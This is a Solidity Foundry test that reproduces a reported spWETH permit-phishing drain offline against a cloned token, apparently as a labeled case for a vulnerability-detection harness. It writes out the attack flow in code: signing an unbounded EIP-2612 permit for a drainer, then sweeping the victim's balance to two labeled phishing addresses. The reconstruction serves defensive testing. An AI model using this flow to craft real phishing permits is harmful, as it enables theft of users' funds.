// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {SparkWETHPermitClone} from
    "../fixtures/permit-phishing/b-incident/SparkWETHPermitClone.sol";

/// @title permit-phishing tier (b): Spark WETH (spWETH) EIP-2612 permit phishing drain, ~$32M.
/// @notice Minimized offline reproduction of the 2024-09-28 spWETH drain (Ethereum drain tx
///         0xf7c00f18...1c1d8fb, block 20847274). The victim signed ONE off-chain phishing
///         `permit` granting the attacker's drainer contract an unbounded allowance; the drainer
///         submitted the permit and swept the victim's entire spWETH balance with TWO
///         `transferFrom` calls that split the proceeds across two recipient wallets, in a single
///         transaction. The harness MUST flag this (verdict VULNERABLE, label vuln).
///
///         On-chain identities are documented in PROVENANCE.md and used here as labels for
///         fidelity (the recipient/spender addresses). The owner is a test key - the real
///         victim's private key is of course unavailable - so the signature is produced offline
///         over this fixture's own EIP-712 domain. The drained AMOUNTS are the real on-chain
///         values. Verdict derived from the real outcome, not hardcoded.
contract SparkWethPermitIncidentTest is Test {
    // Real on-chain spWETH amounts swept from the victim (18 decimals), split across two wallets.
    uint256 constant AMOUNT_1 = 10002771096118655086354; // 10,002.771096118655086354 spWETH -> 0x471c...
    uint256 constant AMOUNT_2 = 2121799929479714715287;  //  2,121.799929479714715287 spWETH -> 0xaa86...
    uint256 constant START_BALANCE = AMOUNT_1 + AMOUNT_2; // 12,124.571025598369801641 spWETH

    // Real, Etherscan-labeled on-chain addresses (labels for fidelity; see PROVENANCE.md).
    address constant DRAINER_SPENDER = 0x33FFF906795804FB77B0b11DfFcf275cAe08016C; // Fake_Phishing573994
    address constant RECIPIENT_1 = 0x471c725Bd1F29850CBb8eeA4cdf6c9Ce3caC5607;     // Fake_Phishing573943
    address constant RECIPIENT_2 = 0xaA862F977d6916A1e89E856FC11Fd99a2F2fAbF8;     // Fake_Phishing442846

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat("[permit-phishing] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED")
        );
    }

    function test_permitPhishing_sparkWeth_incident_vulnerable() public {
        SparkWETHPermitClone token = new SparkWETHPermitClone();

        uint256 victimPk = 0xBEEF; // test key (real victim key unavailable); owner derived from it
        address victim = vm.addr(victimPk);
        token.mint(victim, START_BALANCE);

        // Phishing permit: the victim is tricked into signing an UNBOUNDED permit naming the
        // attacker's drainer contract as spender.
        uint256 value = type(uint256).max;
        uint256 deadline = block.timestamp + 365 days;
        bytes32 structHash = keccak256(
            abi.encode(token.PERMIT_TYPEHASH(), victim, DRAINER_SPENDER, value, token.nonces(victim), deadline)
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPk, digest);

        // The drainer submits the signed permit (anyone can) -> unbounded allowance is set.
        vm.prank(DRAINER_SPENDER);
        token.permit(victim, DRAINER_SPENDER, value, deadline, v, r, s);
        assertEq(token.allowance(victim, DRAINER_SPENDER), value, "phishing permit granted unbounded allowance");

        // The drainer sweeps the whole balance via TWO transferFrom calls splitting the proceeds.
        vm.startPrank(DRAINER_SPENDER);
        token.transferFrom(victim, RECIPIENT_1, AMOUNT_1);
        token.transferFrom(victim, RECIPIENT_2, AMOUNT_2);
        vm.stopPrank();

        bool drained = (token.balanceOf(victim) == 0);
        _report("spark-weth-permit-victim", drained);

        assertTrue(drained, "spWETH permit-phishing must drain the victim (VULNERABLE)");
        assertEq(token.balanceOf(RECIPIENT_1), AMOUNT_1, "recipient 1 received its split");
        assertEq(token.balanceOf(RECIPIENT_2), AMOUNT_2, "recipient 2 received its split");
    }
}
